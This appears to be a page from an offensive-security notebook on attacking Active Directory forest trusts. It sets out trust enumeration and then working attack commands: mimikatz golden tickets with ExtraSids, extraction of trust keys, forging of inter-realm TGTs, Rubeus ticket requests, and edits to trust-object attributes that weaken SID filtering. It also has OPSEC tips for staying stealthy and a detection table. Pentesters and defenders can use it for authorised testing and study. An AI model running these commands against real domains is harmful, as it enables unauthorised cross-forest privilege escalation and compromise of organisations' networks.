# Forest Trust Abuse

## Overview

Forest trusts allow authentication between domains in different forests. Unlike parent-child trusts, forest trusts have **SID filtering enabled by default** — meaning SID history is stripped during authentication. However, other attack vectors exist: TDO (Trust Domain Object) abuse, Kerberos across forest trusts, and resource access via group memberships.

## Forest Trust vs Parent-Child Trust

| Property | Parent-Child (Intra-Forest) | Forest (Inter-Forest) |
|----------|----------------------------|----------------------|
| SID Filtering | Disabled | Enabled |
| Transitive | Yes | Configurable (usually selective) |
| SID History | Honored | Filtered |
| krbtgt hash usefulness | Full forest access | Limited to local forest |
| Trust Key usefulness | Full forest access | Inter-realm TGT forging |
| Group membership | Universal groups flow | Domain local groups |

## Attack Surface

1. **SID filtering disabled** (rare but common in legacy/transitional setups) — ExtraSids attack works across forests
2. **TDO (Trust Domain Object) abuse** — Modify trust attributes to bypass SID filtering
3. **Kerberos abuse** — Inter-realm TGT forging with trust keys
4. **Group membership** — Users from Domain A in Domain B's groups
5. **Resource access** — Explicitly shared resources across forest trusts

## Step 1: Enumerate Forest Trusts

### PowerView

```powershell
# List all trusts
Get-DomainTrust

# Filter for forest trusts only
Get-DomainTrust | Where-Object {$_.TrustType -eq "Forest"}

# Detailed trust properties
Get-DomainTrust | Where-Object {$_.TrustType -eq "Forest"} | Select SourceName, TargetName, TrustDirection, TrustAttributes, TrustTransitive

# Using -API flag for raw API calls
Get-DomainTrust -API

# Enumerate trusts for a specific domain
Get-DomainTrust -Domain target.forest.local
```

### Get-ForestTrust

```powershell
# Get current forest trust information
Get-ForestTrust

# Get forest trust for specific forest
Get-ForestTrust -Forest root.forest.local

# Detailed forest trust info
Get-ForestTrust | Format-List *

# Forest trust with all properties
Get-ForestTrust | Select SourceName, TargetName, TrustType, TrustAttributes, TrustDirection
```

### AD Module

```powershell
# List all trusts
Get-ADTrust -Filter *

# Filter forest trusts
Get-ADTrust -Filter "TrustType -eq 'Forest'"

# Detailed properties
Get-ADTrust -Filter "TrustType -eq 'Forest'" | Format-List Name, Target, TrustType, TrustDirection, TrustAttributes, SIDFilteringForestAware

# List all domains in the forest
Get-ADForest | Select-Object -ExpandProperty Domains

# Get cross-forest trust info
Get-ADForest | Select-Object CrossForestReferences
```

### NetExec

```bash
# Trust enumeration via LDAP
nxc ldap <dc-ip> -u 'user' -p 'pass' -M ad_enum -o TRUST=1

# Show all trusts
nxc ldap <dc-ip> -u 'user' -p 'pass' -M ad_enum -o TRUST_ALL=1

# Domain list
nxc ldap <dc-ip> -u 'user' -p 'pass' -M ad_enum -o DOMAIN_LIST=1

# SMB trust enum
nxc smb <dc-ip> -u 'user' -p 'pass' -M trust_enum
```

### netdom (Native)

```cmd
# List all domain trusts
netdom query trust

# Query specific trust relationship
netdom trust child.dom.local /d:dom.local /verbose

# Verify trust
netdom verify child.dom.local /d:dom.local

# Show trust relationship details
netdom trust child.dom.local /d:dom.local /show
```

## Step 2: SID Filtering Assessment

### Check SID Filtering Status

```powershell
# Determine if SID filtering is enabled
# TrustAttributes bit 0x4 = SID filtering enabled
Get-DomainTrust | Where-Object {$_.TrustType -eq "Forest"} | Select SourceName, TargetName, @{N='SIDFiltering';E={
    if($_.TrustAttributes -band 0x4) {"Enabled"} else {"DISABLED (VULNERABLE)"}
}}

# Specific forest trust check
Get-DomainTrust -Domain target.forest.local | Select SourceName, TargetName, TrustAttributes

# Detailed TrustAttributes parsing
Get-DomainTrust -Domain target.forest.local | ForEach-Object {
    $ta = $_.TrustAttributes
    [PSCustomObject]@{
        Source = $_.SourceName
        Target = $_.TargetName
        Type = $_.TrustType
        Direction = $_.TrustDirection
        Transitive = $_.TrustTransitive
        SIDFiltering = if ($ta -band 0x4) {"Enabled"} else {"Disabled"}
        ForestTrust = if ($ta -band 0x8) {"Yes"} else {"No"}
        CrossOrg = if ($ta -band 0x10) {"Yes"} else {"No"}
        IntraOrg = if ($ta -band 0x20) {"Yes"} else {"No"}
        External = if ($ta -band 0x40) {"Yes"} else {"No"}
        TREAT_AS_EXTERNAL = if ($ta -band 0x400) {"Yes"} else {"No (VULN?)"}
    }
}
```

### If SID Filtering is Disabled

If SID filtering is disabled on a forest trust, the same **ExtraSids golden ticket attack** from child-to-parent works. The target is the foreign forest.

```cmd
# Golden ticket with target forest Enterprise Admins SID
mimikatz # kerberos::golden /user:Administrator /domain:current.dom.local /sid:S-1-5-21-CURRENT /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /ptt
```

However, this is uncommon in production environments. SID filtering is almost always enabled on forest trusts.

## Step 3: TDO (Trust Domain Object) Abuse

Trust Domain Objects (TDOs) are AD objects that store trust configuration. If you have **GenericAll/GenericWrite** privileges on a TDO, you can modify trust attributes — potentially disabling SID filtering.

### Locate TDOs

```powershell
# Find TDOs in the System container
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" | Select name, cn, distinguishedName

# Detailed TDO properties
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" | Format-List *

# Check ACL on TDOs
Get-DomainObjectAcl -LDAPFilter "(objectClass=trustedDomain)" | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteProperty|WriteOwner"} | Format-Table ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```

### Check Current Permissions

```powershell
# Resolve SIDs from TDO ACLs to check who can modify
Get-DomainObjectAcl -LDAPFilter "(objectClass=trustedDomain)" | ForEach-Object {
    $sid = $_.SecurityIdentifier
    try {
        $name = ConvertFrom-SID $sid
        [PSCustomObject]@{
            TDO = $_.ObjectDN
            Rights = $_.ActiveDirectoryRights
            Trustee = $name
            SID = $sid
        }
    } catch {
        [PSCustomObject]@{
            TDO = $_.ObjectDN
            Rights = $_.ActiveDirectoryRights
            Trustee = "UNRESOLVED"
            SID = $sid
        }
    }
}
```

### Modify TDO Attributes (with sufficient rights)

```powershell
# Set TREAT_AS_EXTERNAL flag (0x400) — disables SID filtering behavior
# This modifies the trustAttributes to treat forest trust as external
$tdo = Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" | Where-Object {$_.name -eq "target.forest.local"}
Set-DomainObject -Identity $tdo.distinguishedName -Set @{'trustAttributes'='0x400'} -Verbose

# Verify modification
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" | Select name, trustAttributes
```

**WARNING:** TDO modification is extremely noisy, logged as Event ID 5136 (Directory Service Change), and may break trust relationships. Use only in lab environments.

## Step 4: Kerberos Across Forest Trusts

### Enumerate Trust Keys

```powershell
# Extract trust keys (requires Domain Admin)
# From mimikatz:
# mimikatz # lsadump::trust /patch
# mimikatz # lsadump::lsa /patch /id:<trust-id>

# Look for trust accounts (name ends with $)
Get-DomainUser -LDAPFilter "(samAccountName=*$)" | Where-Object {$_.samAccountName -notlike "*$"}
```

### Forge Inter-Realm TGT

```cmd
# If trust key is obtained, forge inter-realm TGT for forest trust
mimikatz # kerberos::golden /user:Administrator /domain:current.forest.local /sid:S-1-5-21-CURRENT /rc4:TRUST_KEY /target:target.forest.local /service:krbtgt /ptt
```

### Request TGS for Target Forest Resources

```cmd
# After TGT injection, request TGS
Rubeus.exe asktgs /service:cifs/targetdc.target.forest.local /ticket:BASE64 /ptt

# Access resource
dir \\targetdc.target.forest.local\C$
```

## Step 5: Enumerate Foreign Principals

### Foreign Users

```powershell
# Find users from other forests/domains in this domain
Get-DomainForeignUser

# Specific domain
Get-DomainForeignUser -Domain current.forest.local

# Detailed foreign user information
Get-DomainForeignUser | Select-Object UserDomain, UserName, MemberDomain, MemberName, MemberDistinguishedName

# Resolve foreign SIDs
Get-DomainObject -LDAPFilter "(objectClass=foreignSecurityPrincipal)" | ForEach-Object {
    $sid = $_.cn
    try {
        $resolved = ConvertFrom-SID $sid
        [PSCustomObject]@{
            SID = $sid
            ResolvedName = $resolved
            DistinguishedName = $_.DistinguishedName
        }
    } catch {
        [PSCustomObject]@{
            SID = $sid
            ResolvedName = "UNRESOLVED"
            DistinguishedName = $_.DistinguishedName
        }
    }
}
```

### Foreign Group Members

```powershell
# Find groups in this domain with members from other domains/forests
Get-DomainForeignGroupMember

# Resolve member names
Get-DomainForeignGroupMember -Domain current.forest.local | Select GroupName, MemberName, MemberDomain

# Check specific groups for foreign members
Get-DomainGroupMember -Identity "Domain Admins" | Where-Object {$_.MemberDomain -ne $env:USERDOMAIN}
```

### Users with Access to Target Forest

```powershell
# Check if our current domain user has access in target forest
# Target forest user enumeration (requires authentication path)
Get-DomainUser -Domain target.forest.local -Identity Administrator

# List groups in target forest (requires auth)
Get-DomainGroup -Domain target.forest.local -Identity "Domain Admins" | Get-DomainGroupMember
```

## Detection

| Activity | Event ID | Source | Notes |
|----------|----------|--------|-------|
| Forest trust query | 4662 | Security (DC) | Access to TrustedDomain object |
| TDO modification | 5136 | Directory Service | trustAttributes change |
| Cross-forest TGT request | 4768 | Security (DC target) | Account domain different |
| Cross-forest TGS request | 4769 | Security (DC target) | Service in different forest |
| SID filtering bypass | 4672 | Security | Special privileges assigned |

## OPSEC

- Forest trust abuse requires Domain Admin on the source domain
- TDO modification is permanent until reverted — use with extreme caution
- Cross-forest Kerberos traffic is logged on both DCs
- Foreign group membership enumeration is an LDAP query against ForeignSecurityPrincipals container
- SID filtering status can be checked remotely without high privileges
- Inter-realm TGT forgery with trust key is stealthier than krbtgt-based attacks

## References

- [Trust Enumeration (01_Enumeration/04_Trust_Enumeration.md)](../01_Enumeration/04_Trust_Enumeration.md)
- [Child to Parent Domain Attack](./01_Child_to_Parent_Domain.md)
- [Cross Forest Attack](./03_Cross_Forest_Attack.md)
